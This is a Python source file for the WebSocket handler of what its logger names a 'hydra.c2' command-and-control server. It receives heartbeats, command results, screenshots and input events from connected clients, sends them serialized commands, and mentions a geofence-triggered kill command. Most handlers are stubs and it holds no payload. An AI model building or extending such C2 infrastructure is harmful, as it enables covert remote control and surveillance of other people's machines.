import logging
from fastapi import WebSocket
from google.protobuf.json_format import MessageToDict
from core.protobufs.hydra_pb2 import ClientMessage, ServerMessage, Heartbeat
import json

class WebSocketManager:
    def __init__(self):
        self.active_connections = {}  # {client_id: WebSocket}
        self.logger = logging.getLogger("hydra.c2")

    async def _process_client_message(self, websocket: WebSocket, raw_data: bytes):
        try:
            # First try to parse as protobuf
            try:
                msg = ClientMessage()
                msg.ParseFromString(raw_data)
                
                if msg.HasField("heartbeat"):
                    await self._handle_heartbeat(msg.client_id, msg.heartbeat)
                elif msg.HasField("result"):
                    await self._handle_command_result(msg.client_id, msg.result)
                
                return MessageToDict(msg)
            except Exception as e:
                # If protobuf parsing fails, try JSON
                try:
                    # Assume it's JSON if not protobuf
                    data = json.loads(raw_data.decode('utf-8'))
                    message_type = data.get('type', '')
                    
                    if message_type == 'screenshot':
                        await self._handle_screenshot(data.get('client_id', ''), data.get('data', {}))
                    elif message_type == 'input_event':
                        await self._handle_input_event(data.get('client_id', ''), data.get('data', {}))
                    elif message_type == 'beacon':
                        await self._handle_heartbeat(data.get('client_id', ''), data)
                    
                    return data
                except json.JSONDecodeError:
                    self.logger.error(f"Failed to decode message as protobuf or JSON")
                    raise
        except Exception as e:
            self.logger.error(f"Message processing failed: {e}")

    async def _handle_heartbeat(self, client_id: str, hb):
        self.logger.info(f"Heartbeat from {client_id}")
        # Update client status in DB
        # Check geofencing: if hb.geo not in allowed_zones, send kill command

    async def _handle_screenshot(self, client_id: str, data):
        self.logger.info(f"Screenshot received from {client_id}")
        # Forward to any active dashboard connections
        # The format would be handled in c2_server.py with _broadcast_screenshot
        
    async def _handle_input_event(self, client_id: str, data):
        self.logger.info(f"Input event received from {client_id}: {data.get('type', 'unknown')}")
        # Handle remote input events for tracking/logging

    async def send_command(self, client_id: str, command: ServerMessage):
        if client_id in self.active_connections:
            ws = self.active_connections[client_id]
            await ws.send_bytes(command.SerializeToString())

    async def authenticate(self, websocket: WebSocket) -> str:
        try:
            # For development, accept any client ID
            # In production, implement proper authentication
            data = await websocket.receive_text()
            auth_data = json.loads(data)
            return auth_data.get("client_id", "")
        except Exception as e:
            self.logger.error(f"Authentication failed: {e}")
            return ""

    async def handle_connection(self, websocket: WebSocket):
        await websocket.accept()
        client_id = await self.authenticate(websocket)
        
        if not client_id:
            await websocket.close(code=1008)  # Policy violation
            return

        self.active_connections[client_id] = websocket
        self.logger.info(f"Client {client_id} connected")

        try:
            while True:
                raw_data = await websocket.receive_bytes()
                await self._process_client_message(websocket, raw_data)
        except:
            if client_id in self.active_connections:
                del self.active_connections[client_id]
            self.logger.warning(f"Client {client_id} disconnected")